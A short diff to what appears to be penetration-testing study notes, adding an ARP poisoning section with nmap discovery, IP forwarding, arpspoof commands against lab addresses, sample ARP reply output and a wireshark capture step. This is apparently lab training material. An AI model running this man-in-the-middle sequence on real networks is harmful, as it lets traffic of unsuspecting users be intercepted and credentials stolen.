@@ -11,6 +11,23 @@
 ## System and Host Based Attacks
 
 ## Network-Based Attacks
+### ARP Poisoning
+```
+ip a
+
+nmap <subnet>
+- 10.100.13.36 server
+- 10.100.13.37 client
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
+8:0:27:d4:ee:5d 8:0:27:99:aa:a7 0806 42: arp reply 10.100.13.36 is-at 8:0:27:d4:ee:5d
+8:0:27:d4:ee:5d 8:0:27:4a:45:f3 0806 42: arp reply 10.100.13.37 is-at 8:0:27:d4:ee:5d
+
+sudo wireshark -i eth1 -k
+```
 
 ## The Metasploit Framework (MSF)
 
